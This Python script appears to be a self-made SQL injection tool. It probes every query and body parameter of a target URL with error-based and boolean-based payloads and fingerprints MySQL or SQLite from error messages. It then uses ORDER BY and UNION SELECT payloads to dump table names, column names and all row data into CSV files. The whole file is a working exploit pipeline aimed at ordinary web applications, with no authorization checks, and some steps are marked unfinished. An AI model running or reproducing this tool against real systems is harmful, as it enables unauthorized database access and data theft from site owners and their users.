from ast import pattern
import requests
import argparse
import re
import csv
import os



# --------- PATTERNS --------- #
boolean_detection = {
	"' AND '1'='1'--%20" : "' AND '1'='2'--%20",
	"' AND '1'='2'--%20" : "' AND '1'='1'--%20",
    "' OR '1'='1'--%20" : "' OR '1'='2'--%20",
    "' OR '1'='2'--%20" : "' OR '1'='1'--%20"
}

error_based_detection = [
    "'",    # generic quote
    "\"",   # double quote
    ")",    # close parenthesis
    "';",   # quote + semicolon
]

error_patterns = {
	"mysql": [
		"You have an error in your SQL syntax;",
		"Warning: mysql_",
		"MySQL server version for the right syntax",
		"mysqli_fetch",
		"mysql_fetch",
		"mysql_num_rows",
		"mysql_query()",
		"supplied argument is not a valid MySQL",
		"Syntax error or access violation",
		"Unknown column",
		"unknown column",
		"on line",
		"SQL syntax",
		"You have an error in your SQL syntax near",
		"Unknown table"
	],
	"sqlite": [
		"SQLite3::query(): Unable to prepare statement",
		"SQLite3::exec(): Unable to prepare statement",
		"SQLITE_ERROR",
		"unrecognized token:",
		"near \"",
		"syntax error",
		"no such table",
		"no such column",
		"datatype mismatch",
		"not authorized",
		"misuse of aggregate"
	]
}

extraction_patterns = {
	"mysql": {
		"table_names": {
			"key": "table_name",
			"from": "FROM information_schema.tables WHERE table_schema=DATABASE()--%20"
		},
		"column_names": {
			"key": "column_name",
			"from": "FROM information_schema.columns WHERE table_name='$TABLE_NAME'--%20"
		},
		"data_dump": {
			"key": "$COLUMN_NAME",
			"from": "FROM $TABLE_NAME--%20"
		}
	},
	"sqlite": {
		"table_names": {
			"key": "name",
			"from": "FROM sqlite_master WHERE type='table'--%20"
		},
		"column_names": {
			"key": "sql",
			"from": "FROM sqlite_master WHERE type='table' AND name='$TABLE_NAME'--%20"
		},
		"data_dump": {
			"key": "$COLUMN_NAME",
			"from": "FROM $TABLE_NAME--%20"
		}
	}
}
# ----------------------- #



# --------- PRINTS AND WRITE --------- #
def write_table_to_csv(directory, table_name, columns, rows):
    filename = os.path.join(directory, f"{table_name}.csv")
    with open(filename, "w", newline='', encoding="utf-8") as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(columns)
        for row in rows:
            writer.writerow(row)

def print_record(record: dict, index: int | str, filter, base_content = None):
	print(f" Record {index}:")
	if record["infected_param"]:
		print("  - Infected Parameter:", record["infected_param"])
		print("  - Infected Method:", record["infected_type"])
		print("  - Infected Payload:", record["infected_payload"])
	print("  - Body Parameters:", record["body"])
	print("  - Query Parameters:", record["query"])
	print("  - Response Status Code:", record["response"]["status_code"])
	print("  - Response Time (s):", record["response"]["time"])
	if base_content:
		print(f"  - Response new content:\n{filter(base_content, record['response']['content'])} \033[0m\n")
	else:
		print(f"  - Response new content:\n{filter(record['response']['content'])} \033[0m\n")
	print("\n")
# ----------------------- #



# --------- CONTENT TYPE CHECKS --------- #
def is_body_json(headers: dict) -> bool:
	content_type = headers.get("Content-Type", "")
	return "application/json" in content_type

def is_body_form_encoded(headers: dict) -> bool:
	content_type = headers.get("Content-Type", "")
	return "application/x-www-form-urlencoded" in content_type
# ----------------------- #



# --------- INPUT PARSING --------- #
def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("url", metavar="URL", type=str)
	parser.add_argument("-X", type=str, choices=["GET", "POST"], default="GET",
		help="Type of request, if not specified GET will be used.")
	parser.add_argument("--header", action="append", nargs=2, metavar=("NAME", "VALUE"),
		help="Specify a header pair (can be used several times)")
	parser.add_argument("--body", type=str, metavar="VALUE",
		help="Specify body content for POST request")
	
	args = parser.parse_args()
	if args.body and args.X.upper() != "POST":
		parser.error("--body can only be used with -X POST")
	
	body_data = args.body if args.body else ""
	return args.X.upper(), args.url, dict(args.header) if args.header else {}, body_data



def body_params(body_string: str) -> dict[str, str]:
	if body_string:
		body_list = body_string.split('&')
		return {param.split('=', 1)[0]: param.split('=', 1)[1] if '=' in param else '' for param in body_list}
	return {}

def body_string(body_params: dict[str, str]) -> str:
	return '&'.join([f"{key}={value}" for key, value in body_params.items()])



def query_params(query_string : str) -> dict[str, str]:
	if not query_string: return {}
	query_list = query_string.split('&')
	return {param.split('=', 1)[0]: param.split('=', 1)[1] if '=' in param else '' for param in query_list}

def query_string(query_params: dict[str, str]) -> str:
	return '&'.join([f"{key}={value}" for key, value in query_params.items()])

def extract_query_string(full_url: str) -> str:
	return full_url.split('?', 1)[1] if '?' in full_url else ''



def assemble_full_url(base_url: str, query_string: str) -> str:
	return base_url + ('?' + query_string if query_string else '')

def extract_base_url(full_url: str) -> str:
	return full_url.split('?', 1)[0]
# ----------------------- #



# --------- REQUESTS --------- #
def request_record(method: str, full_url: str, headers: dict, body_string: str, infected_param: str | None = None,
				   infected_type: str | None = None, infected_payload: str | None = None) -> dict:
	request = requests.request(method, full_url, headers=headers, data=body_string if method == "POST" else None)
	time = request.elapsed.total_seconds()

	return {
		"body": body_params(body_string),
		"query": query_params(extract_query_string(full_url)),
		"response": {
			"status_code": request.status_code,
			"content": request.content.decode(),
			"time": time
		},
		"infected_param": infected_param if infected_param else None,
		"infected_type": infected_type if infected_type else None,
		"infected_payload": infected_payload if infected_payload else None
	}

def detection_request_records(method: str, full_url: str, headers: dict, _body_string: str) -> list[dict]:
	_body_params = body_params(_body_string)
	_query_params = query_params(extract_query_string(full_url))

	detection_request_records = []

	for param in _body_params.keys():
		body_params_copy = _body_params.copy()
		for error in error_based_detection:
			body_params_copy[param] = error
			detection_request_records.append(request_record(method, assemble_full_url(
				extract_base_url(full_url), query_string(_query_params)), headers, body_string(body_params_copy), param, "error_based", error))

		for boolean in boolean_detection:
			body_params_copy[param] = _body_params[param] + boolean
			detection_request_records.append(request_record(method, assemble_full_url(
				extract_base_url(full_url), query_string(_query_params)), headers, body_string(body_params_copy), param, f"boolean_based", boolean))


	for param in _query_params.keys():
		query_params_copy = _query_params.copy()
		for error in error_based_detection:
			query_params_copy[param] = error
			detection_request_records.append(request_record(method, assemble_full_url(
				extract_base_url(full_url), query_string(query_params_copy)), headers, body_string(_body_params), param, "error_based", error))

		for boolean in boolean_detection:
			query_params_copy[param] = _query_params[param] + boolean
			detection_request_records.append(request_record(method, assemble_full_url(
				extract_base_url(full_url), query_string(query_params_copy)), headers, body_string(_body_params), param, f"boolean_based", boolean))

	return detection_request_records
# ----------------------- #



# --------- RECORD PARSING --------- #
def _normalize_html(s: str) -> str:
    s = re.sub(r'(?is)<script.*?</script>|<style.*?</style>', '', s)
    s = re.sub(r'\s+', ' ', s).strip()
    return s

def _to_lines(s: str) -> list[str]:
    s = re.sub(r'>', '>\n', s)                 # break after tags
    s = re.sub(r'(?<=[.!?])\s+', '\n', s)      # break sentences
    lines = [ln.strip() for ln in s.splitlines() if ln.strip()]
    return lines

def only_new_content(base_html: str, other_html: str) -> str:
	base_set = set(_to_lines(_normalize_html(base_html)))
	other_lines = _to_lines(_normalize_html(other_html))
	diff_lines = [ln for ln in other_lines if ln not in base_set]
	return '\n'.join(diff_lines)

def parse_detection_records(records: dict) -> list[dict]:
	detection_records = []
	for record in records["detections"]:
		record["response"]["content"] = only_new_content(records["default"]["response"]["content"], record["response"]["content"])
		detection_records.append(record)
	return detection_records

def strip_html_tags(text: str) -> str:
    return re.sub(r'<[^>]+>', '', text)
# ----------------------- #



# --------- ANALYSE RECORDS --------- #
def get_boolean_record(records: list[dict], payload: str) -> dict | None:
	for record in records:
		if record["infected_type"] == "boolean_based" and record["infected_payload"] == payload:
			return record

	return None

def get_boolean_record_pair(records: list[dict], record: dict):
	pair_payload = boolean_detection[record["infected_payload"]]
	return get_boolean_record(records, pair_payload)

def get_injection_points(records: list[dict]) -> tuple[set, str | None]:
	injection_points = set()
	checked_pairs = set()
	db_type = None

	for record in records:
		if record["infected_type"] == "error_based":
			if any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns["mysql"]):
				injection_points.add(record["infected_param"])
				db_type = "MySQL"
			elif any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns["sqlite"]):
				injection_points.add(record["infected_param"])
				db_type = "SQLite"
		elif record["infected_type"] == "boolean_based":
			pair_record = get_boolean_record_pair(records, record)
			if not pair_record:
				continue
			pair_key = tuple(sorted([record["infected_payload"], pair_record["infected_payload"]]))
			if pair_key in checked_pairs:
				continue
			checked_pairs.add(pair_key)
			if pair_record["response"]["content"] != record["response"]["content"]:
				injection_points.add(record["infected_param"])

	if injection_points:
		print(f"\n[!] Potential SQL Injection points detected ({len(injection_points)}):\n")
	else:
		print("\n[-] No SQL Injection points detected.\n")

	return injection_points, db_type
# ----------------------- #



# --------- EXTRACTION STRUCTURE --------- #
def get_select_size(injection_point: str, db_type: str, method, url, headers, body, default_request: dict) -> int | None:
    original_query_params = query_params(extract_query_string(url))
    original_body_params = body_params(body)

    for i in range(1, 50):
        payload = f"' ORDER BY {i}--%20"
        # Query param injection
        if injection_point in original_query_params:
            query_params_dict = original_query_params.copy()
            query_params_dict[injection_point] += payload
            full_url = assemble_full_url(extract_base_url(url), query_string(query_params_dict))
            record = request_record(method, full_url, headers, body, injection_point, "extraction", payload)
            if any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns[db_type.lower()]):
                return i - 1
        # Body param injection
        elif injection_point in original_body_params:
            body_params_dict = original_body_params.copy()
            body_params_dict[injection_point] += payload
            body_string_modified = body_string(body_params_dict)
            record = request_record(method, url, headers, body_string_modified, injection_point, "extraction", payload)
            if any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns[db_type.lower()]):
                return i - 1
    return None

def get_pattern_strings(list : int) -> list[str]:
    return [f"'{chr(97 + i) * 5}'" for i in list]

def get_control_strings(list : int) -> list[str]:
    return [f"{chr(97 + i) * 5}" for i in list]

def get_visible_index(injection_point: str, db_type: str, method, url, headers, body, default_request: dict, select_size: int) -> int | None:
	original_query_params = query_params(extract_query_string(url))
	original_body_params = body_params(body)
	control_strings = get_pattern_strings([i for i in range(select_size)])
	union_select = f"' UNION SELECT " + ", ".join(control_strings) + f" --%20"

	if injection_point in original_query_params:
		original_query_params[injection_point] += union_select
	elif injection_point in original_body_params:
		original_body_params[injection_point] += union_select

	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
			body_string(original_body_params), injection_point, "extraction", union_select)
	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])
	
	control_strings = get_control_strings([i for i in range(select_size)])
	for i in range(len(control_strings)):
		if control_strings[i] in diff:
			return i
	return None

def get_pattern_union(select_size: int, visible_index: int, key : str, from_value : str) -> str:
	pattern = [key if i is visible_index else "null" for i in range (select_size)]
	pattern_union = str()
	for i in range(len(pattern)):
		if i < len(pattern) - 1:
			pattern_union += f"{pattern[i]}, "
		else:
			pattern_union += f"{pattern[i]} "

	return f"' UNION SELECT " + pattern_union + from_value
# ----------------------- #



# --------- DATA EXTRACTION --------- #
def extract_table_names(method, url, headers, body, injection_point: str, db_type: str, default_request: dict, visible_index: int, select_size: int):
	original_query_params = query_params(extract_query_string(url))
	original_body_params = body_params(body)

	if db_type.lower() == "mysql":
		extraction_steps = extraction_patterns["mysql"]["table_names"]
	elif db_type.lower() == "sqlite":
		extraction_steps = extraction_patterns["sqlite"]["table_names"]

	pattern_union = get_pattern_union(select_size, visible_index, extraction_steps["key"], extraction_steps["from"])
	if injection_point in original_query_params:
		original_query_params[injection_point] += pattern_union
	elif injection_point in original_body_params:
		original_body_params[injection_point] += pattern_union

	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
			body_string(original_body_params), injection_point, "extraction", pattern_union)
	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])

	# To be continued...
	# Check for SQL errors

	return [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]

def extract_column_names(method, url, headers, body, injection_point: str, table_name: str, db_type: str, default_request: dict, visible_index: int, select_size: int):
	original_query_params = query_params(extract_query_string(url))
	original_body_params = body_params(body)

	if db_type.lower() == "mysql":
		extraction_steps = extraction_patterns["mysql"]["column_names"]
	elif db_type.lower() == "sqlite":
		extraction_steps = extraction_patterns["sqlite"]["column_names"]

	pattern_union = get_pattern_union(select_size, visible_index, extraction_steps["key"], extraction_steps["from"]).replace("$TABLE_NAME", table_name)
	if injection_point in original_query_params:
		original_query_params[injection_point] += pattern_union
	elif injection_point in original_body_params:
		original_body_params[injection_point] += pattern_union

	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
			body_string(original_body_params), injection_point, "extraction", pattern_union)
	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])


	# To be continued...
	# If DBMS is sqlite, parse the CREATE TABLE statement to extract column names

	# To be continued...
	# Check for SQL errors

	return [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]

def extract_data(method, url, headers, body, injection_point: str, table_name: str, db_type: str, default_request: dict, visible_index: int, select_size: int, column_name: str):
	original_query_params = query_params(extract_query_string(url))
	original_body_params = body_params(body)

	if db_type.lower() == "mysql":
		extraction_steps = extraction_patterns["mysql"]["data_dump"]
	elif db_type.lower() == "sqlite":
		extraction_steps = extraction_patterns["sqlite"]["data_dump"]

	pattern_union = get_pattern_union(select_size, visible_index, extraction_steps["key"], extraction_steps["from"]).replace("$TABLE_NAME", table_name).replace("$COLUMN_NAME", column_name)
	if injection_point in original_query_params:
		original_query_params[injection_point] += pattern_union
	elif injection_point in original_body_params:
		original_body_params[injection_point] += pattern_union

	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
			body_string(original_body_params), injection_point, "extraction", pattern_union)
	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])

	# To be continued...
	# Here, check for SQL errors

	return [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]
# ----------------------- #



# --------- MAIN --------- #
def main():
	method, url, headers, body = parse_args()
	if (method == "POST" and body and not (is_body_form_encoded(headers) or is_body_json(headers))):
		print("[-] Unsupported Content-Type for body. Only 'application/x-www-form-urlencoded' and 'application/json' are supported.")
		return

	data_dump_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data_dump")
	if not os.path.exists(data_dump_dir):
		os.makedirs(data_dump_dir)

	try:
		records = {
			"default": request_record(method, url, headers, body),
			"detections": detection_request_records(method, url, headers, body)
		}

		print_record(records["default"], 0, str)
		for i, record in enumerate(records["detections"], 1):
			print_record(record, i, only_new_content, records["default"]["response"]["content"])
		detection_records = parse_detection_records(records)
		injection_points, db_type = get_injection_points(detection_records)
		print("Injection Points:", injection_points if injection_points else "None")
		print("Database Type:", db_type)

		# Create a dir named data_dump if it doesn't exist
		for injection_point in injection_points:
			print(f"[!] Starting extraction for parameter '{injection_point}'...\n")
			
			if not db_type:
				print(f"[!] Cannot proceed with extraction for parameter '{injection_point}' as the database type is unknown.")
				continue

			num_columns = get_select_size(injection_point, db_type, method, url, headers, body, records["default"])
			if num_columns is None:
				print(f"[-] Could not determine the number of columns for injection point '{injection_point}'.\n")
				continue
			
			visible_index = get_visible_index(injection_point, db_type, method, url, headers, body, records["default"], num_columns)
			if visible_index is None:
				print(f"[-] Could not determine the visible index for injection point '{injection_point}'.\n")
				continue

			table_names = extract_table_names(method, url, headers, body, injection_point, db_type, records["default"], visible_index, num_columns)
			print(f"[+] Extracted Table Names:\n{', '.join(table_names)}\n")

			for table in table_names:
				columns_names = extract_column_names(method, url, headers, body, injection_point, table, db_type, records["default"], visible_index, num_columns)
				print(f"[+] Extracted Column Names for table '{table}':\n{', '.join(columns_names)}\n")

				datas = []
				max_len = 0
				for column in columns_names:
					data = extract_data(method, url, headers, body, injection_point, table, db_type, records["default"], visible_index, num_columns, column)
					print(f"[+] Extracted Data for column '{column}' in table '{table}':\n{data}\n")
					datas.append(data)
					max_len = max(max_len, len(data))

				padded_datas = [data + [''] * (max_len - len(data)) for data in datas]
				rows = list(zip(*padded_datas)) if padded_datas else []
				write_table_to_csv("data_dump", table, columns_names, rows)

	except requests.RequestException as e:
		print("[!] An error occurred while making the requests:", e)

if __name__ == "__main__":
	main()
# ----------------------- #